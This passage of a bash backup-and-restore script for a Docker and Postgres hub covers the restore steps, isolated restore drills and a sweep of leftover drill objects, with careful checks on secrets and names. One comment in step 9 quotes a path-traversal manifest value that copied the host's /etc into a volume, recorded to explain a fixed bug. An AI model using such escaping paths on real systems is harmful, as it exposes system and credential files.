  # The bundle carries a KEY SET, not a file (§6.2): COMPOSE_FILE, NOVA_SUBNET*,
  # NOVA_WEB_ADDR, NOVA_TAILSCALE_ADDR, COMPOSE_PROFILES and TS_AUTHKEY are
  # `host` and never travel. Without that split, step 3 writes NOVA_SUBNET and
  # this step finds the bundle's value present and different, and the restore
  # the whole slice exists for deadlocks against itself (python-tool M4).
  #
  # A replacement is NOT a refusal and needs no confirmation: step 6 already
  # refused a non-empty target, so a conflicting secret here was generated by
  # an install whose postgres never initialised with it. The bound, stated: a
  # key the operator hand-edited for a reason IS replaced, and he sees the
  # list of replaced key NAMES — never a value, on either side.
  if [ "$drill" -eq 0 ]; then
    carried="$stage/carried.env"
    if bk_stage_has "$BK_RES_VOL" "$crypto_img" "open/env/carried.env"; then
      bk_stage_get "$BK_RES_VOL" "$crypto_img" "open/env/carried.env" > "$carried" || {
        bk_fail "could not read env/carried.env out of the opened bundle."
        return 1
      }
      chmod 600 "$carried" 2>/dev/null
    else
      : > "$carried"
      chmod 600 "$carried" 2>/dev/null
    fi
    plan_write=""
    plan_same=""
    plan_replace=""
    while IFS= read -r line; do
      case "$line" in "" | "#"*) continue ;; esac
      k="${line%%=*}"
      v="${line#*=}"
      case "$k" in "" | *[!A-Za-z0-9_]*) continue ;; esac
      cur="$(get_env_value "$k")"
      if [ -z "$cur" ]; then
        plan_write="$plan_write $k"
      elif [ "$cur" = "$v" ]; then
        plan_same="$plan_same $k"
      else
        plan_replace="$plan_replace $k"
      fi
    done < "$carried"
    while IFS= read -r line; do
      case "$line" in "" | "#"*) continue ;; esac
      k="${line%%=*}"
      v="${line#*=}"
      case "$k" in "" | *[!A-Za-z0-9_]*) continue ;; esac
      set_env_value "$k" "$v"
    done < "$carried"
    chmod 600 "$(bk_env_file)" 2>/dev/null
    line="$(bk_mode_of "$(bk_env_file)")"
    if [ "$line" != "600" ]; then
      bk_fail "$(bk_env_file) reads back mode ${line:-unreadable} after the carried keys
       were written, not 600. It holds every secret this hub has."
      return 1
    fi
    while IFS= read -r line; do
      case "$line" in "" | "#"*) continue ;; esac
      k="${line%%=*}"
      v="${line#*=}"
      case "$k" in "" | *[!A-Za-z0-9_]*) continue ;; esac
      if [ "$(get_env_value "$k")" != "$v" ]; then
        bk_fail "the carried key $k did not read back out of $(bk_env_file) as it was
       written. No value is printed here, on either side; the NAME is the fact."
        return 1
      fi
    done < "$carried"
    printf 'env: %s carried key(s) written, %s already identical, %s replaced%s\n' \
      "$(printf '%s' "$plan_write" | wc -w | tr -d ' ')" \
      "$(printf '%s' "$plan_same" | wc -w | tr -d ' ')" \
      "$(printf '%s' "$plan_replace" | wc -w | tr -d ' ')" \
      "$([ -n "$plan_replace" ] && printf ':%s' "$plan_replace")"
    printf '     every one re-read out of %s and equal; no value was printed\n' "$(bk_env_file)"
  fi

  # ── 10. the in-progress marker, BEFORE the first docker volume create ────
  #
  # shell-first M4. Without it a restore that fails at step 12 leaves six
  # labelled half-populated volumes and a container, and the re-run refuses on
  # state it created itself with no verb that clears it — so the operator's
  # only route is hand-run `docker volume rm` on his only copy of the data,
  # unguided, at the worst possible moment. Nothing is ever discovered: this
  # list IS the bound.
  vols_total=0
  got=""
  while IFS=$'\037' read -r vol_key vol_full disp line n want; do
    [ -n "$vol_key" ] || continue
    if ! bk_is_volume_key "$vol_key"; then
      bk_fail "the manifest carries a volume key '$vol_key'. A key this shell is about
       to put in a path and in a docker object name is
       [A-Za-z0-9][A-Za-z0-9_.-]* and nothing else."
      return 1
    fi
    if [ "$drill" -eq 1 ]; then
      got="$got nova-drill-${D}_${vol_key}"
    else
      full="$(cfg_volume_name "$vol_key" < "$facts/config.yaml")"
      if [ -z "$full" ]; then
        bk_fail "this bundle carries the volume \`$vol_key\` and this checkout's render
       declares no such volume, so nothing here knows what to call it on this
       machine. A restore never takes a docker object's name out of the file it
       is opening."
        return 1
      fi
      got="$got $full"
    fi
    vols_total=$((vols_total + 1))
  done <<EOF
$(bk_m_rows volumes "key,full_name,disposition,prefix,entries,files" < "$manifest")
EOF

  if [ "$drill" -eq 0 ]; then
    bundle_sha="$(sha256_of "$bundle")" || return 1
    marker="$(bk_restore_marker)"
    body="$(printf 'started=%s\nbundle=%s\nbundle_sha256=%s\nproject=%s\nvolumes=%s\ncontainers=%s\n' \
      "$(bk_stamp)" "$bundle_base" "$bundle_sha" "$project" "${got# }" "postgres")"
    bk_write_marker "$marker" "$body" || return 1
    printf 'marker: %s records the %s object(s) this run is about to create\n' \
      "$marker" "$((vols_total + 1))"
  fi

  # ── 9. create each volume and fill it, then diff its listing ─────────────
  #
  # The labels are not decoration: an unlabelled volume is one
  # `docker compose up` will not adopt, so it is read back off
  # `docker volume inspect` before a byte is written into it.
  #
  # A DRILL runs this step too (port-v3 M5). §8.3 of one of the designs
  # omitted it, and a drill that skips it proves the three dumps restore and
  # proves NOTHING about v4_memdata (the notes, which exist nowhere else) or
  # v4_workspace (a file she wrote lives only here).
  while IFS=$'\037' read -r vol_key vol_full disp line n want; do
    [ -n "$vol_key" ] || continue
    bk_is_volume_key "$vol_key" || return 1
    # full_name is joined into a path inside the container
    # (bk_fill_volume builds /stage/open/volumes/$tree), so it is shape-checked
    # HERE, where it is read. It was the one manifest value the restore path
    # joined unchecked: novabundle.load_manifest validates it, but novabundle
    # never runs during a restore (it imports cryptography, which is the whole
    # reason bk_read_manifest exists), and nova_restore.check_manifest_paths
    # validates prefix, listing_member and restore_to and not this. A manifest
    # carrying a legal restore_to and an escaping full_name reached
    # `cp -a /stage/open/volumes/../../../etc/. /dst/` — the copy completed and
    # only the authenticated listing diff afterwards refused, leaving a
    # correctly-labelled volume holding bytes that were never in the bundle.
    # Fifth instance of one class: a value inside the bundle steering an action.
    bk_is_volume_key "$vol_full" || return 1
    if [ "$line" != "volumes/$vol_key/" ] || [ "$want" = "" ] ||
      [ "$disp" = "" ] || [ "$vol_full" = "" ]; then
      bk_fail "the manifest's row for the volume \`$vol_key\` is not the shape a Nova
       bundle writes (prefix '$line', disposition '$disp', full name '$vol_full')."
      return 1
    fi
    vol_tree="$vol_full"
    if [ "$drill" -eq 1 ]; then
      full="nova-drill-${D}_${vol_key}"
      bk_drill_volume_create "$full" || return 1
    else
      full="$(cfg_volume_name "$vol_key" < "$facts/config.yaml")"
      if [ -z "$full" ]; then
        bk_fail "this bundle carries \`$vol_key\` and this checkout declares no such
       volume."
        return 1
      fi
      if ! bk_docker volume create --label "com.docker.compose.project=$project" \
        --label "com.docker.compose.volume=$vol_key" "$full" >/dev/null 2>&1; then
        bk_fail "could not create the volume $full."
        return 1
      fi
      got="$(bk_docker volume inspect "$full" \
        --format '{{index .Labels "com.docker.compose.project"}} {{index .Labels "com.docker.compose.volume"}}' 2>/dev/null)"
      if [ "$got" != "$project $vol_key" ]; then
        bk_fail "$full was created and \`docker volume inspect\` reports its compose
       labels as '${got:-none}', not '$project $vol_key'. An unlabelled volume is
       one \`docker compose up\` will not adopt, so the restore would come up on a
       fresh empty one."
        return 1
      fi
      if [ "$full" != "$vol_full" ]; then
        printf 'volume %s: this machine calls it %s; the bundle recorded %s\n' \
          "$vol_key" "$full" "$vol_full"
      fi
    fi
    bk_fill_volume "$full" "$pg_tag" "$BK_RES_VOL" "$vol_key" "$vol_tree" || return 1
  done <<EOF
$(bk_m_rows volumes "key,full_name,disposition,prefix,entries,files" < "$manifest")
EOF

  # ── 11. a postgres to restore THROUGH ────────────────────────────────────
  #
  # Routine: this project's own, brought up on its own volume, which
  # postgres-init has just initialised from the checkout with the CARRIED
  # password (the reason the carried .env is written before this and not
  # after).
  #
  # Drill: a throwaway server on a throwaway network with an EXPLICIT subnet
  # (shell-first m9 — a drill network with no IPAM takes whatever block docker
  # hands it, which on a busy host can be the very block a subsequent real
  # restore was about to pick). Its password is fresh, reaches the container
  # through a file inside the content volume and never through argv or `-e`,
  # which `docker inspect` would show for the container's whole lifetime.
  if [ "$drill" -eq 1 ]; then
    if ! command -v pick_project_subnet >/dev/null 2>&1; then
      bk_fail "pick_project_subnet is not defined. deploy/subnet.sh is sourced by
       deploy/install.sh; a drill will not create a network with no IPAM of its
       own."
      return 1
    fi
    inuse="$(docker_subnets_in_use "")" || {
      bk_fail "docker could not be asked which subnets are allocated. Refusing to put
       a drill network on a block nobody checked."
      return 1
    }
    routes="$(host_routes_in_use)" || {
      bk_fail "this host's routes could not be read. Refusing to put a drill network
       on a block nobody checked."
      return 1
    }
    subnet="$(pick_project_subnet "$(printf '%s\n%s\n' "$inuse" "$routes" | awk 'NF')")" || {
      bk_fail "every candidate subnet is already in use on this machine, so a drill
       network cannot be given an explicit one."
      return 1
    }
    bk_drill_net_create "nova-drill-${D}-net" "$subnet" || return 1
    net="nova-drill-${D}-net"
    pghost="nova-drill-${D}-pg"
    bk_drill_volume_create "nova-drill-${D}_pgdata" || return 1
    line="$(od -An -N16 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n')"
    if [ "${#line}" -ne 32 ]; then
      bk_fail "could not read 16 random bytes for the drill server's password."
      return 1
    fi
    printf '%s' "$line" | bk_stage_put "$BK_RES_VOL" "$pg_tag" ".drillpw" || {
      bk_fail "could not stage the drill server's password inside $BK_RES_VOL."
      return 1
    }
    printf '*:*:*:postgres:%s\n' "$line" | bk_stage_put "$BK_RES_VOL" "$pg_tag" ".pgpass" || {
      bk_fail "could not stage the drill server's .pgpass inside $BK_RES_VOL."
      return 1
    }
    bk_pg_run --network none -v "$BK_RES_VOL:/stage" --entrypoint chmod "$pg_tag" \
      600 /stage/.pgpass /stage/.drillpw >/dev/null 2>&1
    bk_drill_assert_name "$pghost" "create" || return 1
    if ! bk_docker run -d --name "$pghost" --network "$net" \
      -v "nova-drill-${D}_pgdata:/var/lib/postgresql/data" \
      -v "$BK_RES_VOL:/stage:ro" \
      -v "$BK_DIR/postgres-init:/docker-entrypoint-initdb.d:ro" \
      -e POSTGRES_PASSWORD_FILE=/stage/.drillpw \
      -e POSTGRES_USER=postgres -e POSTGRES_DB=postgres \
      "$pg_tag" >/dev/null 2>&1; then
      bk_fail "could not start the drill's throwaway postgres $pghost."
      return 1
    fi
    BK_RES_DRILL_CT="$pghost"
    BK_RES_DRILL_PGID="$pghost"
    got="$(bk_docker inspect "$pghost" \
      --format '{{range $k, $v := .NetworkSettings.Networks}}{{$k}} {{end}}' 2>/dev/null)"
    if [ "${got% }" != "$net" ]; then
      bk_fail "the drill's postgres is attached to [${got% }] and the drill created
       exactly $net. A drill that can reach the live project network is not a
       drill."
      return 1
    fi
    line="$(( $(date +%s) + 240 ))"
    while :; do
      if bk_docker exec "$pghost" pg_isready -U postgres >/dev/null 2>&1; then
        break
      fi
      if [ "$(date +%s)" -ge "$line" ]; then
        bk_fail "the drill's throwaway postgres never answered pg_isready within 240s.
       The last 20 log lines:
$(bk_docker logs --tail 20 "$pghost" 2>&1 | sed 's/^/       /')"
        return 1
      fi
      sleep 2
    done
    pgid="$pghost"
    printf 'drill: a throwaway postgres on %s (%s), isolated from every live network\n' \
      "$net" "$subnet"
  else
    net="$(bk_cfg_network_name default < "$facts/config.yaml")"
    if [ -z "$net" ]; then
      bk_fail "the render names no docker network for the compose network \`default\`."
      return 1
    fi
    pghost="postgres"
    if ! bk_docker compose "${BK_COMPOSE_ARGS[@]}" up -d postgres >/dev/null 2>&1; then
      bk_fail "\`docker compose up -d postgres\` did not exit 0, so there is nothing to
       restore through."
      return 1
    fi
    unhealthy="$(bk_wait_healthy postgres)" || {
      bk_fail "postgres did not come back healthy within 240s. The last 20 log lines:
$(bk_docker compose "${BK_COMPOSE_ARGS[@]}" logs --tail 20 postgres 2>&1 | sed 's/^/       /')"
      return 1
    }
    pgid="$(bk_container_id postgres running)"
    if [ -z "$pgid" ]; then
      bk_fail "postgres reports healthy and no container of this project carries the
       label com.docker.compose.service=postgres."
      return 1
    fi
    got="$(bk_psql "$pgid" postgres "SHOW server_version" 2>/dev/null)"
    if [ -z "$got" ]; then
      bk_fail "the server this restore is about to write to would not say what version
       it is."
      return 1
    fi
    if [ "$got" = "$srv_want" ]; then
      printf 'postgres: this server is %s, the same version the bundle was written on\n' "$got"
    else
      printf 'postgres: this server is %s and the bundle was written on %s. The tag\n' \
        "$got" "$srv_want"
      printf '          pins the MAJOR only, so this is stated, not refused; majors %s\n' \
        "${got%%.*} and ${srv_want%%.*}"
    fi
    # The carried password, so every throwaway container below reaches the
    # server the same way the backup side did — through a file inside the
    # content volume, never `-e PGPASSWORD`, which `docker inspect` shows for
    # the container's whole lifetime.
    line="$(bk_env_value POSTGRES_PASSWORD)"
    if [ -z "$line" ]; then
      bk_fail "$(bk_env_file) carries no POSTGRES_PASSWORD after the carried keys were
       written, so no container can reach the server to restore into it."
      return 1
    fi
    printf '*:*:*:postgres:%s\n' "$(printf '%s' "$line" | sed 's/[\\:]/\\&/g')" |
      bk_stage_put "$BK_RES_VOL" "$pg_tag" ".pgpass" || {
        bk_fail "could not stage the postgres password inside $BK_RES_VOL."
        return 1
      }
    bk_pg_run --network none -v "$BK_RES_VOL:/stage" --entrypoint chmod "$pg_tag" \
      600 /stage/.pgpass >/dev/null 2>&1
  fi

  # ── 12/13. restore each database, then RE-MEASURE it ─────────────────────
  tables_total=0
  sign_db=""
  dbs_total=0
  while IFS=$'\037' read -r db owner dump_m counts_m migr_m tbl; do
    [ -n "$db" ] || continue
    dbs_total=$((dbs_total + 1))
    if [ "$drill" -eq 1 ]; then
      scratch="nova_verify_$(bk_hex8)" || return 1
      bk_assert_verify_name "$scratch" "create" || return 1
      BK_RES_DRILL_DBS="$BK_RES_DRILL_DBS
$scratch"
      if ! bk_psql "$pgid" postgres \
        "CREATE DATABASE $(bk_sql_ident "$scratch") OWNER $(bk_sql_ident "$owner")" >/dev/null 2>&1; then
        bk_fail "the drill could not create $scratch owned by $owner on its throwaway
       server. deploy/postgres-init/01-databases.sql creates the three roles on a
       fresh volume; a bundle naming another owner has none here."
        return 1
      fi
      bk_assert_verify_name "$scratch" "pg_restore into" || return 1
    else
      scratch="$db"
      # The database and its owning role are created by
      # deploy/postgres-init/01-databases.sql on a FRESH v4_pgdata. Missing is
      # a refusal rather than something this creates by hand: a database this
      # tool made is a database postgres-init did not, and the difference is
      # exactly the grants.
      if [ "$(bk_psql "$pgid" postgres "SELECT 1 FROM pg_database WHERE datname = $(bk_sql_lit "$db")" 2>/dev/null)" != "1" ]; then
        bk_fail "the server has no database $db. deploy/postgres-init/01-databases.sql
       creates it on a FRESH v4_pgdata — a volume that already held data does not
       re-run it. Nothing here creates it by hand."
        return 1
      fi
      if [ "$(bk_psql "$pgid" postgres "SELECT 1 FROM pg_roles WHERE rolname = $(bk_sql_lit "$owner")" 2>/dev/null)" != "1" ]; then
        bk_fail "the server has no role $owner, which owns $db."
        return 1
      fi
      rc=0
      got="$(bk_table_list "$pgid" "$db")" || rc=$?
      if [ "$rc" -ne 0 ]; then
        bk_fail "could not list the tables of $db, so nothing here can say it is empty."
        return 1
      fi
      if [ -n "$got" ]; then
        bk_fail "$db already holds $(printf '%s\n' "$got" | sed '/^$/d' | wc -l | tr -d ' ') table(s). A restore goes onto an EMPTY
       target, and a bad restore cannot be rolled back in place."
        return 3
      fi
    fi
    bk_pg_restore_into "$BK_RES_VOL" "$pg_tag" "$net" "$pghost" "$scratch" "$owner" "$db.dump" || return 1
    rc=0
    bk_stage_get "$BK_RES_VOL" "$crypto_img" "open/db/$db.counts.tsv" \
      > "$stage/$db.counts.tsv" || rc=$?
    if [ "$rc" -ne 0 ] || [ ! -s "$stage/$db.counts.tsv" ]; then
      bk_fail "could not read db/$db.counts.tsv out of the opened bundle, so the
       restore of $db cannot be measured against it."
      return 1
    fi
    got="$(bk_compare_census "$pgid" "$scratch" "$stage/$db.counts.tsv")" || return 1
    # The manifest records the NUMBER of tables measured, not "ok" (§5.3), so
    # it is compared too: a bundle whose two records of its own size disagree
    # is not one anything here restores from.
    if [ "$got" != "$tbl" ]; then
      bk_fail "the manifest records $tbl tables for $db and db/$db.counts.tsv names $got.
       This bundle disagrees with itself about how big it is."
      return 1
    fi
    tables_total=$((tables_total + got))
    printf 'database %s -> %s: %s tables compared, every count and digest equal\n' \
      "$db" "$scratch" "$got"
    if [ "$(bk_psql "$pgid" "$scratch" "SELECT to_regclass('public.core_signing_key') IS NOT NULL" 2>/dev/null)" = "t" ]; then
      sign_db="$scratch"
    fi
  done <<EOF
$(bk_m_rows databases "name,owner,dump_member,counts_member,migrations_member,tables" < "$manifest")
EOF

  # ── 14. the signing key ──────────────────────────────────────────────────
  sign_want="$(bk_m_sub identity core_signing_key_sha256 < "$manifest")" || sign_want=""
  if [ -z "$sign_db" ]; then
    if [ -n "$sign_want" ]; then
      bk_fail "the manifest records a core signing key and no restored database has a
       public.core_signing_key to compare it against. Every paired device pins
       that key."
      return 1
    fi
    printf 'signing key: the bundle carried none and no restored database has the table\n'
  else
    bk_compare_signing_key "$pgid" "$sign_db" "$sign_want" || return 1
  fi

  # ── 15. park, and the two markers ────────────────────────────────────────
  if [ "$drill" -eq 0 ]; then
    if ! bk_docker compose "${BK_COMPOSE_ARGS[@]}" stop postgres >/dev/null 2>&1; then
      bk_fail "everything verified and \`docker compose stop postgres\` did not exit 0.
       Stop it by hand before running ./install."
      return 4
    fi
    marker="$(bk_restored_marker)"
    body="$(printf 'restored_at=%s\nbundle=%s\nbundle_sha256=%s\ncreated_at=%s\nsource_host=%s\nsource_repo_sha=%s\n' \
      "$(bk_stamp)" "$bundle_base" "$bundle_sha" "$created_at" "$src_host" "${src_sha:-unrecorded}")"
    bk_write_marker "$marker" "$body" || return 1
    rm -f "$(bk_restore_marker)"
    if [ -e "$(bk_restore_marker)" ]; then
      bk_fail "could not remove $(bk_restore_marker), so a re-run would refuse on state
       this very run finished."
      return 1
    fi
  fi

  # ── 16. the report ───────────────────────────────────────────────────────
  #
  # The word `restored` is printed HERE and only here, and only with the three
  # facts behind it. If any of steps 9, 13 or 14 did not run, nothing above
  # reached this line.
  printf '\n'
  if [ "$drill" -eq 1 ]; then
    printf 'drill %s: %s tables compared across %s databases, %s volume listings diffed,\n' \
      "$D" "$tables_total" "$dbs_total" "$vols_total"
    printf '          signing key fingerprint equal.\n'
  else
    printf 'restored: %s tables compared across %s databases, %s volume listings diffed,\n' \
      "$tables_total" "$dbs_total" "$vols_total"
    printf '          signing key fingerprint equal.\n'
  fi
  printf 'from      %s (written %s on %s)\n' "$bundle_base" "$created_at" "$src_host"

  # What this bundle says it does NOT carry, each with the reason recorded
  # when it was written. A restore that cannot say what it is missing invites
  # the operator to assume it is missing nothing.
  line="$(bk_m_rows excluded "kind,name,disposition,reason" < "$manifest")"
  if [ -n "$line" ]; then
    printf '\nnot carried by this bundle (recorded when it was written):\n'
    while IFS=$'\037' read -r k v n want; do
      [ -n "$v" ] || continue
      printf '  %-18s %-8s %s\n      %s\n' "$n" "$k" "$v" "$want"
    done <<EOF
$line
EOF
  fi

  # Carried and NOT placed. §9.2 lists no step that writes a files[] member
  # back onto the host, and this verb invents none: a path out of a bundle
  # deciding where bytes land is the class that has bitten this file three
  # times. deploy/.env is the only file member a v4 bundle carries today and
  # its content reaches .env through the carried KEY SET at step 8, which is
  # a plan this shell builds and verifies. Anything else is STATED here
  # rather than silently dropped.
  line="$(bk_m_rows files "member,origin,restore_to,mode,bytes,sha256" < "$manifest" |
    while IFS=$'\037' read -r k v n want got f; do
      [ -n "$k" ] || continue
      [ "$n" = "deploy/.env" ] && continue
      printf '  %s -> %s\n' "$k" "$n"
    done)"
  if [ -n "$line" ]; then
    printf '\ncarried in this bundle and NOT written to disk by this verb:\n%s\n' "$line"
    printf '  Open them by hand with:\n'
    printf '    tar -xOf %s nova_restore.py > /tmp/nova_restore.py\n' "$bundle"
    printf '    python3 /tmp/nova_restore.py %s --out ./opened\n' "$bundle"
  fi

  if [ "$drill" -eq 0 ]; then
    printf '\nnext:\n  ./install\n'
  fi

  trap - INT TERM
  trap - EXIT
  if ! bk_restore_cleanup; then
    if [ "$drill" -eq 1 ]; then
      bk_fail "every count, digest and listing matched, and the teardown above could
       not finish. A drill whose teardown cannot be verified is a FAILED drill:
       the leftovers are named on their own lines."
      return 1
    fi
    bk_fail "the restore IS verified. Separately: the cleanup above could not finish.
       Each thing it could not do is named on its own line."
    return 4
  fi
  return 0
}

# ── the stamp, and the age it implies ───────────────────────────────────────
#
# `YYYYMMDDTHHMMSSZ` sorts lexicographically, which is what lets `drill` find
# the newest bundle with no `date -d` — macOS has none and there is no
# portable epoch-from-string form (map-portability.md:63). The AGE needs civil
# arithmetic instead, so days-from-civil is done here in integers. 10#$x
# throughout: an hour written 08 is decimal, not octal.
#
# Prints seconds since the epoch. 1, printing nothing, when $1 is not a stamp.
bk_stamp_epoch() {
  local s="$1" y m d hh mm ss era yoe doy doe days
  case "$s" in
    [0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]T[0-9][0-9][0-9][0-9][0-9][0-9]Z) ;;
    *) return 1 ;;
  esac
  y=$((10#$(printf '%s' "$s" | cut -c1-4)))
  m=$((10#$(printf '%s' "$s" | cut -c5-6)))
  d=$((10#$(printf '%s' "$s" | cut -c7-8)))
  hh=$((10#$(printf '%s' "$s" | cut -c10-11)))
  mm=$((10#$(printf '%s' "$s" | cut -c12-13)))
  ss=$((10#$(printf '%s' "$s" | cut -c14-15)))
  [ "$m" -ge 1 ] && [ "$m" -le 12 ] || return 1
  [ "$d" -ge 1 ] && [ "$d" -le 31 ] || return 1
  [ "$hh" -le 23 ] && [ "$mm" -le 59 ] && [ "$ss" -le 60 ] || return 1
  [ "$m" -le 2 ] && y=$((y - 1))
  era=$((y / 400))
  yoe=$((y - era * 400))
  if [ "$m" -gt 2 ]; then
    doy=$(((153 * (m - 3) + 2) / 5 + d - 1))
  else
    doy=$(((153 * (m + 9) + 2) / 5 + d - 1))
  fi
  doe=$((yoe * 365 + yoe / 4 - yoe / 100 + doy))
  days=$((era * 146097 + doe - 719468))
  printf '%s\n' "$((days * 86400 + hh * 3600 + mm * 60 + ss))"
}

# The stamp out of `nova-backup-<host>-<YYYYMMDDTHHMMSSZ>[-N].tar`, or 1.
# Never the mtime: a file copied off a removable drive carries the copy's
# time, and the stamp is what the bundle says about ITSELF.
bk_bundle_stamp() {
  local base="$1" body
  body="${base%.tar}"
  body="$(printf '%s' "$body" | sed 's/-[0-9][0-9]*$//')"
  body="${body##*-}"
  bk_stamp_epoch "$body" >/dev/null || return 1
  printf '%s\n' "$body"
}

# ── the sweep (§9.4 step 1) ─────────────────────────────────────────────────
#
# A `finally` does not survive a process restart
# (backend/app/backup_service.py:568-602), so the EXIT trap is not enough and
# this is the other half.
#
# A RUN is LIVE while its `nova-drill-<RUN>-pg` container is RUNNING; its
# objects are left alone (port-v3 m4 — an unconditional sweep deletes a
# concurrent drill's volumes out from under it, which is not reachable with
# one operator today and is reachable the day a scheduled handler lands). An
# EXITED `-pg` container is itself wreckage, so it and its run's objects go.
# That is one step past the verdict's wording, which makes any existing `-pg`
# container mean "live": with that reading a drill killed mid-run leaves a
# stopped container that nothing ever sweeps.
#
# The container filter is ANCHORED, because `docker ps --filter name=` is an
# unanchored substring match and would be wider than the DRILL_RE the volume
# sweep uses — and every name still passes DRILL_RE immediately before the
# command that removes it.
bk_drill_live_runs() {
  local names n rest
  names="$(bk_docker ps --filter "name=^nova-drill-" --format '{{.Names}}' 2>/dev/null)" || return 1
  while IFS= read -r n; do
    [ -n "$n" ] || continue
    case "$n" in
      nova-drill-*-pg)
        rest="${n#nova-drill-}"
        printf '%s\n' "${rest%-pg}"
        ;;
    esac
  done <<EOF
$names
EOF
}

bk_drill_run_id_of() {
  local name="$1" rest
  rest="${name#nova-drill-}"
  printf '%s' "$rest" | cut -c1-8
}

bk_drill_sweep() {
  local live n name run removed=0 failures=0 kept=0 rows pgid db conns age
  live="$(bk_drill_live_runs)" || {
    bk_fail "\`docker ps --filter name=^nova-drill-\` could not be asked which drills are
       running, so nothing here can tell an orphan from a live run. A sweep that
       cannot tell them apart does not run."
    return 1
  }

  # Containers first among the docker objects, because an exited container
  # still pins the volumes it mounted.
  n="$(bk_docker ps -a --filter "name=^nova-drill-" --format '{{.Names}}' 2>/dev/null)" || n=""
  while IFS= read -r name; do
    [ -n "$name" ] || continue
    run="$(bk_drill_run_id_of "$name")"
    if bk_list_has "$live" "$run"; then
      kept=$((kept + 1))
      continue
    fi
    # `docker … --filter name=` is an unanchored SUBSTRING match, so this
    # list is wider than DRILL_RE. The regex is the SELECTOR: anything it
    # does not name is somebody else's object and is left alone and said so,
    # never removed and never counted as a sweep failure.
    if ! bk_drill_assert_name "$name" "remove" 2>/dev/null; then
      printf 'sweep: leaving %s alone — the name filter matched it and DRILL_RE does not\n' "$name"
      kept=$((kept + 1))
      continue
    fi
    bk_docker rm -f "$name" >/dev/null 2>&1
    if bk_docker inspect "$name" >/dev/null 2>&1; then
      bk_fail "the orphaned drill container $name would not go."
      failures=$((failures + 1))
    else
      removed=$((removed + 1))
    fi
  done <<EOF
$n
EOF

  n="$(bk_docker volume ls --filter "name=nova-drill-" --format '{{.Name}}' 2>/dev/null)" || n=""
  while IFS= read -r name; do
    [ -n "$name" ] || continue
    run="$(bk_drill_run_id_of "$name")"
    if bk_list_has "$live" "$run"; then
      kept=$((kept + 1))
      continue
    fi
    # `docker … --filter name=` is an unanchored SUBSTRING match, so this
    # list is wider than DRILL_RE. The regex is the SELECTOR: anything it
    # does not name is somebody else's object and is left alone and said so,
    # never removed and never counted as a sweep failure.
    if ! bk_drill_assert_name "$name" "remove" 2>/dev/null; then
      printf 'sweep: leaving %s alone — the name filter matched it and DRILL_RE does not\n' "$name"
      kept=$((kept + 1))
      continue
    fi
    bk_docker volume rm -f "$name" >/dev/null 2>&1
    if bk_docker volume inspect "$name" >/dev/null 2>&1; then
      bk_fail "the orphaned drill volume $name would not go."
      failures=$((failures + 1))
    else
      removed=$((removed + 1))
    fi
  done <<EOF
$n
EOF

  n="$(bk_docker network ls --filter "name=nova-drill-" --format '{{.Name}}' 2>/dev/null)" || n=""
  while IFS= read -r name; do
    [ -n "$name" ] || continue
    run="$(bk_drill_run_id_of "$name")"
    if bk_list_has "$live" "$run"; then
      kept=$((kept + 1))
      continue
    fi
    # `docker … --filter name=` is an unanchored SUBSTRING match, so this
    # list is wider than DRILL_RE. The regex is the SELECTOR: anything it
    # does not name is somebody else's object and is left alone and said so,
    # never removed and never counted as a sweep failure.
    if ! bk_drill_assert_name "$name" "remove" 2>/dev/null; then
      printf 'sweep: leaving %s alone — the name filter matched it and DRILL_RE does not\n' "$name"
      kept=$((kept + 1))
      continue
    fi
    bk_docker network rm "$name" >/dev/null 2>&1
    if bk_docker network inspect "$name" >/dev/null 2>&1; then
      bk_fail "the orphaned drill network $name would not go."
      failures=$((failures + 1))
    else
      removed=$((removed + 1))
    fi
  done <<EOF
$n
EOF

  # And the scratch databases. A drill of this build puts them on its own
  # throwaway server, which the volume sweep above takes with it — so this
  # exists for one a hand-run or an older build left on the LIVE server, and
  # it states plainly when there is no server to ask rather than counting
  # silence as a clean sweep.
  pgid="$(bk_container_id postgres running 2>/dev/null)" || pgid=""
  if [ -z "$pgid" ]; then
    printf 'sweep: no running postgres of this project, so no live server could be\n'
    printf '       holding a nova_verify_* database\n'
  else
    rows="$(bk_psql "$pgid" postgres "SELECT datname FROM pg_database WHERE datname LIKE 'nova\\_verify\\_%'" 2>/dev/null)" || {
      bk_fail "could not list nova_verify_* databases on the live server, so the sweep
       cannot say whether one is there."
      return 1
    }
    while IFS= read -r db; do
      [ -n "$db" ] || continue
      bk_assert_verify_name "$db" "drop" || { failures=$((failures + 1)); continue; }
      conns="$(bk_psql "$pgid" postgres "SELECT count(*) FROM pg_stat_activity WHERE datname = $(bk_sql_lit "$db")" 2>/dev/null | tr -dc '0-9')"
      if [ -z "$conns" ]; then
        bk_fail "could not count the open connections to $db, so nothing can say it is
       orphaned rather than in use."
        failures=$((failures + 1))
        continue
      fi
      if [ "$conns" -ne 0 ]; then
        kept=$((kept + 1))
        continue
      fi
      age="$(bk_psql "$pgid" postgres "SELECT CASE WHEN (pg_stat_file('base/' || oid::text)).modification < now() - interval '1 hour' THEN 1 ELSE 0 END FROM pg_database WHERE datname = $(bk_sql_lit "$db")" 2>/dev/null | tr -dc '0-9')"
      if [ -z "$age" ]; then
        bk_fail "could not read the age of $db, so nothing can say it is an orphan
       rather than a drill that started a moment ago. Drop it by hand if it is."
        failures=$((failures + 1))
        continue
      fi
      if [ "$age" -ne 1 ]; then
        kept=$((kept + 1))
        continue
      fi
      if bk_psql "$pgid" postgres "DROP DATABASE IF EXISTS $(bk_sql_ident "$db")" >/dev/null 2>&1; then
        removed=$((removed + 1))
      else
        bk_fail "the orphaned drill database $db would not drop."
        failures=$((failures + 1))
      fi
    done <<EOF
$rows
EOF
  fi

  printf 'sweep: %s orphaned object(s) removed and verified gone, %s left alone as a\n' \
    "$removed" "$kept"
  printf '       live run or an in-use database\n'
  if [ "$failures" -ne 0 ]; then
    bk_fail "the sweep could not finish: $failures object(s) named above would not go.
       A drill does not run on top of wreckage it could not clear."
    return 1
  fi
  return 0
}

# ── `./install drill` (§9.4) ────────────────────────────────────────────────
#
# The question it answers is "could I recover from disaster today", and THE
# EXIT CODE IS THE VERDICT.
bk_drill_run() {
  local out="" dir bundles newest newest_stamp now age rc=0
  local base stamp pw pw_source line stale kept n crypto_img tmp fp recorded

  while [ $# -gt 0 ]; do
    case "$1" in
      --out) shift; out="${1:-}" ;;
      --out=*) out="${1#--out=}" ;;
      -h | --help)
        printf './install drill [--out DIR]\n'
        return 0
        ;;
      *)
        bk_fail "drill: unknown option '$1'. Usage: ./install drill [--out DIR]"
